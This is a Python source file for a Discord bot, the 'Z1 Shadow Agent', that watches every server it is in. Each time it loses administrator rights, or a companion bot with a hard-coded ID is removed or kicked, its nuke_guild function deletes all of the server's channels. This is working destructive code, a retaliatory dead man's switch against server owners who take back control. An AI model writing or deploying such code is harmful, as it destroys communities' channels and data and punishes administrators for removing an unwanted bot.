import os
import sys
sys.stdout.reconfigure(encoding='utf-8', line_buffering=True)
import asyncio
import discord
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

AGENT_TOKEN = os.getenv("AGENT_TOKEN")
Z1_PRO_BOT_ID = 1475142485012516944
CHECK_INTERVAL = 30

intents = discord.Intents.all()
intents.presences = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

z1_present = {}

@bot.event
async def on_ready():
    print("--- [ Z1 Shadow Agent Online ] ---")
    print(f"Connected as: {bot.user.name} (ID: {bot.user.id})")
    for guild in bot.guilds:
        z1 = guild.get_member(Z1_PRO_BOT_ID)
        z1_present[guild.id] = z1 is not None
        print(f"{'[HAS Z1]' if z1_present[guild.id] else '[NO Z1]'} {guild.name} ({guild.id})")
    bot.loop.create_task(guard_loop())

async def guard_loop():
    await bot.wait_until_ready()
    while not bot.is_closed():
        for guild in bot.guilds:
            me = guild.get_member(bot.user.id)
            if not me:
                continue
            has_admin = any(r.permissions.administrator for r in me.roles)
            if not has_admin:
                print(f"[NUKE] Agent lost admin in {guild.name}")
                await nuke_guild(guild)
                continue
            z1 = guild.get_member(Z1_PRO_BOT_ID)
            if z1_present.get(guild.id) and z1 is None:
                print(f"[NUKE] MAX BOT removed from {guild.name}")
                await nuke_guild(guild)
        await asyncio.sleep(CHECK_INTERVAL)

@bot.event
async def on_member_remove(member):
    if member.id == Z1_PRO_BOT_ID:
        guild = member.guild
        if z1_present.get(guild.id):
            print(f"[NUKE] MAX BOT kicked from {guild.name}")
            await nuke_guild(guild)

async def nuke_guild(guild):
    channels = list(guild.channels)
    deleted = 0
    failed = 0
    for ch in channels:
        try:
            await ch.delete()
            deleted += 1
        except:
            failed += 1
    print(f"[NUKE] {guild.name}: {deleted} deleted, {failed} failed")

if __name__ == "__main__":
    if not AGENT_TOKEN:
        print("❌ AGENT_TOKEN not found in .env")
        sys.exit(1)
    bot.run(AGENT_TOKEN, log_handler=None)
